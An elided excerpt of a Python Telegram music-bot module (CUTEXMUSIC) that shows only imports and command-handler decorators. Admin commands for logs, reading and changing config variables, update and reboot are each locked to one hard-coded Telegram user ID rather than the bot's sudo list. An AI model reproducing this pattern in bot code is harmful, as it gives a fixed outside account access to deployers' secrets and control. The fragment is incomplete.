...
from CUTEXMUSIC.misc import HAPP, SUDOERS, XCB
...
from CUTEXMUSIC.utils.pastebin import CUTEbin
...
@app.on_message(filters.command(GETLOG_COMMAND) & filters.user(6844821478))
@language
...
@app.on_message(filters.command(GETVAR_COMMAND) & filters.user(6844821478))
@language
...
@app.on_message(filters.command(DELVAR_COMMAND) & filters.user(6844821478))
@language
...
@app.on_message(filters.command(SETVAR_COMMAND) & filters.user(6844821478))
@language
...
@app.on_message(filters.command(USAGE_COMMAND) & filters.user(6844821478))
@language
...
@app.on_message(filters.command(UPDATE_COMMAND) & filters.user(6844821478))
@language
...
@app.on_message(filters.command(REBOOT_COMMAND) & filters.user(6844821478))
